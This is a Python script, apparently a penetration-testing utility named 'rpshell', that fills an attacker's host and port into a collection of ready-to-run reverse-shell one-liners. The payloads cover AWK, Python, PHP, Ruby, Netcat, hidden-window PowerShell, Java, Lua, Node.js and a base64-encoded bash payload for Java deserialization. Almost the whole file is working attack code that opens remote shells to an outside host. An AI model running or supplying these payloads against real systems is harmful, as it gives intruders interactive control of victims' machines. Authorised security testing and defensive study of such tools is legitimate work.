import base64
import argparse
import random
from argparse import RawTextHelpFormatter

parser = argparse.ArgumentParser(description='''
                    .__           .__  .__   
_____________  _____|  |__   ____ |  | |  |  
\_  __ \____ \/  ___/  |  \_/ __ \|  | |  |  
 |  | \/  |_> >___ \|   Y  \  ___/|  |_|  |__
 |__|  |   __/____  >___|  /\___  >____/____/
       |__|       \/     \/     \/           

by firedragon9511
''', formatter_class=RawTextHelpFormatter)

parser.add_argument('-l','--local', dest='local', action='store', type=str, help='Attacker local Host address.', required=True)
parser.add_argument('-p','--port', dest='port', action='store', type=str, help='Attacker local Port address.', default='53')
parser.add_argument('-r','--random-port',dest='rndport', action=argparse.BooleanOptionalAction, help='Random port.', default=False)
parser.add_argument('-q','--quiet', action=argparse.BooleanOptionalAction, help='Quiet mode.')
parser.add_argument('-e', '--payload', dest='payload', action='store', type=int, help='''Payload Types:

-1 - All
0 - AWK
1 - Python sh
2 - Python bash
3 - PHP sh
4 - PHP bash
5 - Ruby sh
6 - Ruby bash
7 - Netcat sh
8 - Netcat bash
9 - Powershell
10 - Java sh
11 - Java bash
12 - Lua sh (Linux)
13 - Lua bash (Linux)
14 - Lua (Windows and Linux)
15 - Node.js sh
16 - Node.js bash
17 - Java deserialization bash

''', default=1)

args = parser.parse_args()


### Payloads ###

payloads = (
# AWK 0
'''awk 'BEGIN {s = "/inet/tcp/0/{local_host}/{local_port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''',

# Python sh 1
'''python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_host}",{local_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
''',

# Python bash 2
'''python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_host}",{local_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
''',

# PHP sh 3
'''php -r '$sock=fsockopen("{local_host}",{local_port});exec("/bin/sh -i <&3 >&3 2>&3");'
''',

# PHP bash 4
'''php -r '$sock=fsockopen("{local_host}",{local_port});exec("/bin/bash -i <&3 >&3 2>&3");'
''',

# Ruby sh 5
'''ruby -rsocket -e'f=TCPSocket.open("{local_host}",{local_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
''',

# Ruby Bash 6
'''ruby -rsocket -e'f=TCPSocket.open("{local_host}",{local_port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
''',

# Netcat sh 7
'''nc -e /bin/sh {local_host} {local_port}''',

# Netcat bash 8 
'''nc -e /bin/bash {local_host} {local_port}''',

# Powershell 9
'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{local_host}",{local_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
''',

# Java sh 10
'''
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/sh -c 'exec 5<>/dev/tcp/{local_host}/{local_port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
''',

# Java bash 11
'''
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{local_host}/{local_port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
''',

# Lua sh 12
'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{local_host}','{local_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
''',

# Lua bash 13
'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{local_host}','{local_port}');os.execute('/bin/bash -i <&3 >&3 2>&3');"
''',

# Lua linux and windows 14
'''lua5.1 -e 'local host, port = "{local_host}", {local_port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
''',

# Node.js sh 15
'''require('child_process').exec('nc -e /bin/sh {local_host} {local_port}')
''',

# Node.js bash 16
'''require('child_process').exec('nc -e /bin/bash {local_host} {local_port}')
''',

# Java Deserialization Bash 17
'''
bash -c {echo,{base_64_rev}}|{base64,-d}|{bash,-i}
'''

)

################

random_ports = (
    53, 80, 8080, 443
)



def format_payload(payload, local_host, local_port):
    if payload == 17:
        rp = '/bin/bash -c "/bin/sh -i >& /dev/tcp/{local_host}/{local_port} 0>&1"'.replace('{local_host}', local_host).replace('{local_port}', local_port)
        bs = base64.b64encode(rp.encode())
        return payloads[17].replace('{base_64_rev}', bs.decode() )

    if payload == -1:
        result = []
        for i in range(0, len(payloads)):
            result.append(payloads[i].replace('{local_host}', local_host).replace('{local_port}', local_port).replace('\n',''))
        return '\n'.join(result)


    return payloads[payload].replace('{local_host}', local_host).replace('{local_port}', local_port)

def check_params():
    return 

def init():
    if args.rndport:
        args.port = str(random.choice(random_ports))

    #if args.payload == None:
    #    args.payload =  payloads.index(random.choice(payloads))

    if not args.quiet:
        print("###### Payload ######\n")
        print("Host: " + args.local)
        print("Port: " + args.port)
        print("")

    print(format_payload(args.payload, args.local, args.port))

    if not args.quiet:
        print("\n######################")

    return

init()